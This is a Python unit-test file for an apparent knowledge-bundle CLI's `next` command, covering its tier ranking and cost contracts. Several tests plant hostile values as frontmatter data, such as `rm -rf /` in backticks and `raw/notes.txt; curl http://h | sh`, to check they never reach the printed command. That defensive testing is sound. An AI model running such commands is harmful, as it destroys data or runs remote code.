"""Unit tests for the `next` CLI command and its tier engine
(`openkos.cli.next_action`): a read-only, deterministic pointer to the one
runnable command worth running next over the current bundle.

Follows `test_status.py`'s pattern exactly: `_init_workspace` is copied
verbatim, the workspace snapshot comes from the shared
`tests.unit.cli.conftest` helper (#281 replaced the per-module copies), and
every cost-contract assertion patches a PUBLIC module attribute via
`monkeypatch.setattr` -- never a private internal, never an rglob counter
(design's Testing Strategy).
"""

import unicodedata
from collections.abc import Callable
from pathlib import Path

import pytest
from typer.testing import CliRunner

from openkos import config
from openkos import lint as lint_check
from openkos.cli import next_action
from openkos.cli.main import app
from openkos.graph import sqlite_graph
from openkos.llm.base import EMBED_DIM
from openkos.resolution import CandidateGroup
from openkos.resolution import find_exact_title_groups as _real_find_exact_title_groups
from openkos.state import fts, vectorstore
from tests.unit.cli.conftest import snapshot_bytes as _snapshot
from tests.unit.conftest import LOCAL_BACKEND_LOCALITY

runner = CliRunner()


def _init_workspace(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    result = runner.invoke(app, ["init"])
    assert result.exit_code == 0


class _OfflineOllama:
    """Serves both halves of `OllamaClient` without a network, mirroring
    `test_status.py`'s helper of the same name."""

    locality = LOCAL_BACKEND_LOCALITY
    """Stands in for `OllamaClient.locality` (issue #240): the CLI reads it
    for the embedding-host advisory and the confidential local exemption,
    and a fake without it raises `AttributeError` inside a fail-open
    handler -- a fixture gap that would read as a degrade."""

    def chat(self, messages: object) -> str:
        return '{"extract": false}'

    def embed(self, texts: "list[str]") -> "list[list[float]]":
        return [[1.0] + [0.0] * (EMBED_DIM - 1) for _ in texts]


class _RaisingOllamaClient:
    """A sentinel that raises if constructed at all -- proves no model
    backend is ever built on the `next` path (spec: No Model Backend
    Constructed)."""

    def __init__(self, *args: object, **kwargs: object) -> None:
        raise AssertionError("OllamaClient must never be constructed by `next`")


def _write_doc(path: Path, *, doc_type: str = "Concept", title: str = "Stub") -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        f"---\ntype: {doc_type}\ntitle: {title}\n---\n# {title}\n",
        encoding="utf-8",
    )


def _write_below_source_sensitivity_bundle(tmp_path: Path) -> None:
    """Present vector index, one Source (confidential), one descendant
    (public) below it -- reused from `test_status.py`'s below-source-
    sensitivity fixture (design: same closure algorithm)."""
    sources_dir = tmp_path / "bundle" / "sources"
    sources_dir.mkdir(parents=True, exist_ok=True)
    (sources_dir / "a.md").write_text(
        "---\ntype: Source\ntitle: A\nresource: raw/a.txt\n"
        "sensitivity: confidential\n---\nBody.\n",
        encoding="utf-8",
    )
    concepts_dir = tmp_path / "bundle" / "concepts"
    concepts_dir.mkdir(parents=True, exist_ok=True)
    (concepts_dir / "derived.md").write_text(
        "---\ntype: Concept\ntitle: Derived\nsensitivity: public\n"
        "provenance:\n  - sources/a\n---\nBody.\n",
        encoding="utf-8",
    )


def _write_multi_source_uncovered_only_bundle(tmp_path: Path) -> None:
    """A bundle carrying a `multi-source-uncovered` finding but NO
    `below-source-sensitivity` finding (trap 1's fixture, reused verbatim
    from `test_status.py`)."""
    sources_dir = tmp_path / "bundle" / "sources"
    sources_dir.mkdir(parents=True, exist_ok=True)
    (sources_dir / "a.md").write_text(
        "---\ntype: Source\ntitle: A\nresource: raw/a.txt\n"
        "sensitivity: public\n---\nBody.\n",
        encoding="utf-8",
    )
    (sources_dir / "c.md").write_text(
        "---\ntype: Source\ntitle: C\nresource: raw/c.txt\n"
        "sensitivity: confidential\n---\nBody.\n",
        encoding="utf-8",
    )
    concepts_dir = tmp_path / "bundle" / "concepts"
    concepts_dir.mkdir(parents=True, exist_ok=True)
    (concepts_dir / "from-c.md").write_text(
        "---\ntype: Concept\ntitle: From C\nsensitivity: confidential\n"
        "provenance:\n  - sources/c\n---\nBody.\n",
        encoding="utf-8",
    )
    (concepts_dir / "mixed.md").write_text(
        "---\ntype: Concept\ntitle: Mixed\nsensitivity: public\n"
        "provenance:\n  - sources/a\n  - concepts/from-c\n---\nBody.\n",
        encoding="utf-8",
    )


def _write_unextracted_source(
    tmp_path: Path, *, name: str = "notes", resource: str = "raw/notes.txt"
) -> None:
    sources_dir = tmp_path / "bundle" / "sources"
    sources_dir.mkdir(parents=True, exist_ok=True)
    resource_line = f"resource: {resource}\n" if resource else ""
    (sources_dir / f"{name}.md").write_text(
        f"---\ntype: Source\ntitle: {name.title()}\n{resource_line}"
        "extraction_status: failed\n---\nBody.\n",
        encoding="utf-8",
    )


# --- Phase 1: cost-contract foundation (`_BundleSignals`) -----------------


def test_tier1_only_path_pays_only_the_bootstrap_gates_single_walk(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Stopping at tier 1 (missing vector index) pays exactly one bundle
    walk -- the #386 bootstrap gate's `collect_docs`, which must prove the
    bundle is non-empty before `reindex` may be recommended -- and never
    `find_exact_title_groups` (spec: First-Hit Short-Circuit Cost
    Contract, updated by #386)."""
    _init_workspace(tmp_path, monkeypatch)
    _write_doc(tmp_path / "bundle" / "concepts" / "alpha.md", title="Alpha")
    docs_calls = {"n": 0}
    groups_calls = {"n": 0}
    real_collect_docs = lint_check.collect_docs

    def _counting_collect_docs(
        bundle_dir: Path,
    ) -> tuple[list[lint_check.LintDoc], list[str]]:
        docs_calls["n"] += 1
        return real_collect_docs(bundle_dir)

    def _counting_find_exact_title_groups(bundle_dir: Path) -> list[CandidateGroup]:
        groups_calls["n"] += 1
        return []

    monkeypatch.setattr(
        "openkos.cli.next_action.lint_check.collect_docs", _counting_collect_docs
    )
    monkeypatch.setattr(
        "openkos.cli.next_action.find_exact_title_groups",
        _counting_find_exact_title_groups,
    )

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos reindex" in result.stdout
    assert docs_calls["n"] == 1
    assert groups_calls["n"] == 0


def test_docs_property_calls_collect_docs_exactly_once_when_read_twice(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`_BundleSignals.docs`, read twice within one run (tiers 2 and 3),
    still calls `collect_docs` exactly once -- the memo makes "one
    `collect_docs()` call" true by construction (design: "lazy memoized
    signals")."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors = tmp_path / ".openkos"
    seed_vectors.mkdir(parents=True, exist_ok=True)
    calls = {"n": 0}
    real_collect_docs = lint_check.collect_docs

    def _counting_collect_docs(
        bundle_dir: Path,
    ) -> tuple[list[lint_check.LintDoc], list[str]]:
        calls["n"] += 1
        return real_collect_docs(bundle_dir)

    monkeypatch.setattr(lint_check, "collect_docs", _counting_collect_docs)
    from openkos import config

    layout = config.WorkspaceLayout(tmp_path)
    signals = next_action._BundleSignals(layout)

    _ = signals.docs
    _ = signals.docs

    assert calls["n"] == 1


def _spy_walks(
    monkeypatch: pytest.MonkeyPatch, *, real_groups: bool = False
) -> tuple[dict[str, int], dict[str, int]]:
    """Monkeypatch counting wrappers onto `collect_docs` and
    `find_exact_title_groups`, returning their call-count dicts."""
    docs_calls = {"n": 0}
    groups_calls = {"n": 0}
    real_collect_docs = lint_check.collect_docs

    def _counting_collect_docs(
        bundle_dir: Path,
    ) -> tuple[list[lint_check.LintDoc], list[str]]:
        docs_calls["n"] += 1
        return real_collect_docs(bundle_dir)

    def _counting_find_exact_title_groups(bundle_dir: Path) -> list[CandidateGroup]:
        groups_calls["n"] += 1
        return _real_find_exact_title_groups(bundle_dir) if real_groups else []

    monkeypatch.setattr(
        "openkos.cli.next_action.lint_check.collect_docs", _counting_collect_docs
    )
    monkeypatch.setattr(
        "openkos.cli.next_action.find_exact_title_groups",
        _counting_find_exact_title_groups,
    )
    return docs_calls, groups_calls


def test_tier2_only_path_triggers_exactly_one_bundle_walk(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Stopping at tier 2 performs exactly one bundle walk (spec:
    First-Hit Short-Circuit Cost Contract, "Stopping at tier 2...")."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path)
    docs_calls, groups_calls = _spy_walks(monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos ingest raw/notes.txt" in result.stdout
    assert docs_calls["n"] == 1
    assert groups_calls["n"] == 0


def test_tier3_only_path_shares_tier2s_single_bundle_walk(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Stopping at tier 3 shares tier 2's single `collect_docs` call,
    exercised through the real CLI path, not `_BundleSignals` directly
    (spec: First-Hit Short-Circuit Cost Contract, "...sharing tier 2's
    walk")."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_below_source_sensitivity_bundle(tmp_path)
    docs_calls, groups_calls = _spy_walks(monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos backfill-sensitivity" in result.stdout
    assert docs_calls["n"] == 1
    assert groups_calls["n"] == 0


def test_tier4_path_performs_at_most_three_bundle_walks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Reaching tier 4 performs at most three bundle walks in total:
    `collect_docs` (1, shared by tiers 2/3) plus `find_exact_title_groups`
    (2 internal walks), spied on together in one run (spec: First-Hit
    Short-Circuit Cost Contract, "Reaching tier 4...")."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
    docs_calls, groups_calls = _spy_walks(monkeypatch, real_groups=True)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos duplicates" in result.stdout
    assert docs_calls["n"] + (2 * groups_calls["n"]) <= 3


# --- #386: bootstrap rung -- an empty bundle outranks the reindex tier ----


def test_bootstrap_empty_bundle_recommends_ingest_not_reindex(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A freshly created workspace (zero eligible documents) is told to
    ingest its first source, never to `reindex` an empty bundle -- there is
    nothing to index yet, so the missing-index recommendation would be
    meaningless (issue #386)."""
    _init_workspace(tmp_path, monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" in result.stdout
    assert "first source" in result.stdout
    assert "openkos reindex" not in result.stdout


def test_bootstrap_declines_when_any_eligible_document_exists(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One eligible document is enough to make the missing vector index a
    real, actionable absence again: the bootstrap rung declines and tier 1
    recommends `reindex` (issue #386)."""
    _init_workspace(tmp_path, monkeypatch)
    _write_doc(tmp_path / "bundle" / "concepts" / "alpha.md", title="Alpha")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos reindex" in result.stdout
    assert "openkos ingest" not in result.stdout


def test_bootstrap_declines_when_the_vector_store_is_populated(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """The bootstrap rung gates the missing-vector-index tier only: with a
    populated vector store it declines without a recommendation, so an
    empty-but-indexed bundle falls through to the no-action pointer rather
    than nagging about a first ingest (issue #386)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" not in result.stdout
    assert "No ranked action found" in result.stdout


def test_bootstrap_pays_one_docs_walk_and_no_group_walk(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The bootstrap rung reuses `_BundleSignals.docs` -- one memoized
    `collect_docs` call, never a redundant walk, and never the exact-title
    group walk (module cost contract, #386)."""
    _init_workspace(tmp_path, monkeypatch)
    docs_calls, groups_calls = _spy_walks(monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" in result.stdout
    assert docs_calls["n"] == 1
    assert groups_calls["n"] == 0


def test_bootstrap_over_an_unreadable_only_bundle_still_names_the_skips(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A bundle whose only documents could not be parsed has zero ELIGIBLE
    documents, so the bootstrap rung fires -- and the walk it paid observed
    the skipped files, so they are named alongside the recommendation (D4
    honesty guard, #275/#386)."""
    _init_workspace(tmp_path, monkeypatch)
    _write_unparseable_doc(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" in result.stdout
    assert "concepts/broken.md: skipped (unparseable frontmatter)" in result.stdout


# --- Phase 2: tier engine and order ----------------------------------------


def _seed_all_four_tiers(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
    *,
    vectors_present: bool,
) -> None:
    if vectors_present:
        seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path)
    _write_below_source_sensitivity_bundle(tmp_path)
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")


def test_all_four_tiers_present_tier_1_wins(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A bundle carrying all four tier findings at once recommends only
    tier 1's command (spec: Pinned Tier Order, "All four tiers present,
    tier 1 wins")."""
    _init_workspace(tmp_path, monkeypatch)
    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=False)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos reindex" in result.stdout
    assert "openkos ingest" not in result.stdout
    assert "openkos backfill-sensitivity" not in result.stdout
    assert "openkos duplicates" not in result.stdout


def test_tier_2_wins_once_tier_1_is_peeled_off(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """With the vector index present, tier 2 (unextracted source) wins over
    tiers 3 and 4 (spec: "Tier 2 outranks tier 3")."""
    _init_workspace(tmp_path, monkeypatch)
    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=True)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos ingest raw/notes.txt" in result.stdout
    assert "openkos backfill-sensitivity" not in result.stdout
    assert "openkos duplicates" not in result.stdout


def test_tier_3_wins_once_tiers_1_and_2_are_peeled_off(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """With the vector index present and no unextracted sources, tier 3
    (below-source-sensitivity) wins over tier 4 (spec: "Tier 3 outranks
    tier 4")."""
    _init_workspace(tmp_path, monkeypatch)
    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=True)
    for path in (tmp_path / "bundle" / "sources").glob("*.md"):
        if path.stem == "notes":
            path.unlink()

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos backfill-sensitivity" in result.stdout
    assert "openkos duplicates" not in result.stdout
    assert "openkos ingest" not in result.stdout


def test_tier_4_wins_once_tiers_1_2_3_are_all_peeled_off(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """With every higher tier empty, tier 4 (duplicate groups) wins (spec:
    Duplicate-Group Check Gated on Higher Tiers, "runs only when tiers 1-3
    are all empty")."""
    _init_workspace(tmp_path, monkeypatch)
    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=True)
    for path in (tmp_path / "bundle" / "sources").glob("*.md"):
        if path.stem == "notes":
            path.unlink()
    (tmp_path / "bundle" / "concepts" / "derived.md").unlink()

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos duplicates" in result.stdout
    assert "openkos reindex" not in result.stdout
    assert "openkos ingest" not in result.stdout
    assert "openkos backfill-sensitivity" not in result.stdout


def test_tier_1_command_is_fixed_reindex(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Tier 1's printed command is exactly `openkos reindex` regardless of
    finding detail (spec: Per-Tier Command, scenario 3). The bundle carries
    one eligible document so the #386 bootstrap rung declines."""
    _init_workspace(tmp_path, monkeypatch)
    _write_doc(tmp_path / "bundle" / "concepts" / "alpha.md", title="Alpha")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos reindex" in result.stdout


def test_tier_4_command_is_fixed_curate(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Tier 4's printed command is exactly `openkos curate` -- the verb that
    RESOLVES a pending duplicate group, not the read-only `duplicates`
    display (issue #386). The reason still names `openkos duplicates` as
    the way to review the groups first."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos curate" in result.stdout
    assert "`openkos duplicates`" in result.stdout
    assert "Run: openkos duplicates" not in result.stdout


@pytest.mark.parametrize(
    ("titles", "expected"),
    [
        (
            (("Stoicism", "STOICISM"),),
            "1 candidate group with identical titles is pending review.",
        ),
        (
            (("Stoicism", "STOICISM"), ("Kant", "KANT")),
            "2 candidate groups with identical titles are pending review.",
        ),
    ],
    ids=["one-group", "two-groups"],
)
def test_tier_4_reason_agrees_with_its_own_count(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    titles: tuple[tuple[str, str], ...],
    expected: str,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Tier 4's reason inflects the noun from its count but hardcoded the
    verb, so a single group read "1 candidate group ... are pending
    review". The count and the verb come from the same number and must
    agree; `status` sidesteps this by ending its own line with a command
    instead of a verb (`main.py:5323-5324`)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    concepts_dir = tmp_path / "bundle" / "concepts"
    for index, (first, second) in enumerate(titles):
        _write_doc(concepts_dir / f"dup-{index}a.md", title=first)
        _write_doc(concepts_dir / f"dup-{index}b.md", title=second)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos curate" in result.stdout
    assert expected in result.stdout


def test_tier_2_command_matches_the_findings_own_retry_command(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Tier 2's printed command equals the unextracted-source finding's own
    retry command (spec: Per-Tier Command, scenario 1)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/notes.txt")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest raw/notes.txt" in result.stdout


def test_tier_3_command_equals_backfill_sensitivity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Tier 3's printed command equals `openkos backfill-sensitivity` from
    the finding's own detail (spec: Per-Tier Command, scenario 2)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_below_source_sensitivity_bundle(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos backfill-sensitivity" in result.stdout


# --- Trap 1: multi-source-uncovered's negating detail sentence ------------


def test_trap1_multi_source_uncovered_never_surfaces_a_negated_command(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A bundle with only a `multi-source-uncovered` finding (no
    `below-source-sensitivity` finding) never fires tier 3, and never
    surfaces the negated `openkos backfill-sensitivity` command that
    `multi-source-uncovered`'s own detail string contains
    (`lint.py:766-768`)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_multi_source_uncovered_only_bundle(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos backfill-sensitivity" not in result.stdout
    assert "No ranked action found" in result.stdout


# --- Trap 2: check_unextracted's empty-`resource` fallback ----------------


def test_trap2_bare_ingest_fallback_never_fires_tier_2(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """When every unextracted finding is the `check_unextracted` empty-
    `resource` fallback (`lint.py:632`), tier 2 declines rather than
    printing the bare, non-runnable `openkos ingest`, and evaluation
    continues to tier 3/4."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" not in result.stdout
    assert "Run: openkos curate" in result.stdout


@pytest.mark.parametrize(
    "payload",
    [
        "x`rm -rf /`y",
        # The dangerous shape is not an unrelated command but the tier's OWN
        # verb carrying an appended option: `--auto` turns the recommended
        # sweep from preview-and-confirm into an unattended bundle-wide write.
        "x`openkos backfill-sensitivity --auto`y",
        "`openkos backfill-sensitivity --help`",
    ],
)
def test_document_controlled_sensitivity_cannot_dictate_the_printed_command(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    payload: str,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A document's `sensitivity` frontmatter is stored verbatim and is
    interpolated into the below-source-sensitivity detail BEFORE the command
    it names. No value it carries -- not another command, and not the tier's
    own verb with an option appended -- may become the line printed after
    `Run:`. Tier 3's command takes no argument, so it is matched exactly."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    sources_dir = tmp_path / "bundle" / "sources"
    sources_dir.mkdir(parents=True, exist_ok=True)
    (sources_dir / "a.md").write_text(
        "---\ntype: Source\ntitle: A\nresource: raw/a.txt\n"
        "sensitivity: confidential\n---\nBody.\n",
        encoding="utf-8",
    )
    concepts_dir = tmp_path / "bundle" / "concepts"
    concepts_dir.mkdir(parents=True, exist_ok=True)
    (concepts_dir / "derived.md").write_text(
        f'---\ntype: Concept\ntitle: Derived\nsensitivity: "{payload}"\n'
        "provenance:\n  - sources/a\n---\nBody.\n",
        encoding="utf-8",
    )

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    for line in result.stdout.splitlines():
        if line.startswith("Run: "):
            assert line == "Run: openkos backfill-sensitivity"


def test_option_shaped_resource_never_becomes_a_printed_argument(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Tier 2's argument position is for a resource path. A `resource` that
    reads as an option would change what the recommended command does, so it
    is declined rather than printed."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="-rf")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" not in result.stdout
    assert "Run: openkos curate" in result.stdout


def test_shell_metacharacter_resource_never_becomes_the_printed_command(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A Source's `resource` is stored verbatim from the ingested path, so it
    can carry spaces or shell metacharacters. Tier 2 prints a command only
    when the argument is a plain path; otherwise it declines and evaluation
    continues, because a command that is not runnable as printed is worse
    than no recommendation at all."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/notes.txt; curl http://h | sh")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "curl" not in result.stdout
    assert "Run: openkos ingest" not in result.stdout
    assert "Run: openkos curate" in result.stdout


# --- Duplicate-group check gated on higher tiers ---------------------------


def test_duplicate_group_check_does_not_run_when_tier_1_fires(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The exact-title-group check does not run when tier 1 already fired
    (spec: Duplicate-Group Check Gated on Higher Tiers, scenario 1)."""
    _init_workspace(tmp_path, monkeypatch)
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
    calls = {"n": 0}

    def _counting(bundle_dir: Path) -> list[CandidateGroup]:
        calls["n"] += 1
        return []

    monkeypatch.setattr("openkos.cli.next_action.find_exact_title_groups", _counting)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert calls["n"] == 0


def test_duplicate_group_check_does_not_run_when_tier_2_fires(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """The exact-title-group check does not run when tier 2 already fired
    (spec: Duplicate-Group Check Gated on Higher Tiers, scenario 2)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path)
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
    calls = {"n": 0}

    def _counting(bundle_dir: Path) -> list[CandidateGroup]:
        calls["n"] += 1
        return []

    monkeypatch.setattr("openkos.cli.next_action.find_exact_title_groups", _counting)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos ingest raw/notes.txt" in result.stdout
    assert calls["n"] == 0


def test_duplicate_group_check_does_not_run_when_tier_3_fires(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """The exact-title-group check does not run when tier 3 already fired
    (spec: Duplicate-Group Check Gated on Higher Tiers, scenario 3)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_below_source_sensitivity_bundle(tmp_path)
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
    calls = {"n": 0}

    def _counting(bundle_dir: Path) -> list[CandidateGroup]:
        calls["n"] += 1
        return []

    monkeypatch.setattr("openkos.cli.next_action.find_exact_title_groups", _counting)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos backfill-sensitivity" in result.stdout
    assert calls["n"] == 0


def test_duplicate_group_check_runs_only_when_tiers_1_to_3_are_empty(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """The exact-title-group check runs, and `openkos duplicates` is
    recommended, once tiers 1-3 are all empty (spec: Duplicate-Group Check
    Gated on Higher Tiers, scenario 4)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
    calls = {"n": 0}

    def _counting(bundle_dir: Path) -> list[CandidateGroup]:
        calls["n"] += 1
        return _real_find_exact_title_groups(bundle_dir)

    monkeypatch.setattr("openkos.cli.next_action.find_exact_title_groups", _counting)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert calls["n"] == 1
    assert "openkos duplicates" in result.stdout


# --- Phase 3: CLI wiring, honesty output, no-backend guard -----------------


def test_next_refuses_when_not_a_workspace(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A directory that is not an initialized workspace exits non-zero,
    prints a clear error to stderr, and prints no raw traceback (spec:
    Workspace Presence Check, "Run outside a workspace")."""
    monkeypatch.chdir(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code != 0
    assert isinstance(result.exception, SystemExit)
    assert "Traceback" not in result.stderr


def test_next_exits_zero_on_every_in_workspace_state(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Every in-workspace state -- including a freshly initialized, empty
    bundle -- exits 0 (spec: Workspace Presence Check, "Every in-workspace
    state exits 0")."""
    _init_workspace(tmp_path, monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0


def test_next_rejects_json_flag(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """No `--json` or other structured output mode is offered (spec:
    Read-Only and Human-Readable Only)."""
    _init_workspace(tmp_path, monkeypatch)

    result = runner.invoke(app, ["next", "--json"])

    assert result.exit_code != 0
    assert isinstance(result.exception, SystemExit)


def test_next_never_writes_to_the_workspace(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """No file under the workspace is created, modified, or deleted across
    an empty, healthy, and all-tiers-firing run (spec: No mutation on any
    run)."""
    _init_workspace(tmp_path, monkeypatch)
    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=False)
    before = _snapshot(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert _snapshot(tmp_path) == before


def test_next_never_constructs_ollama_client(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
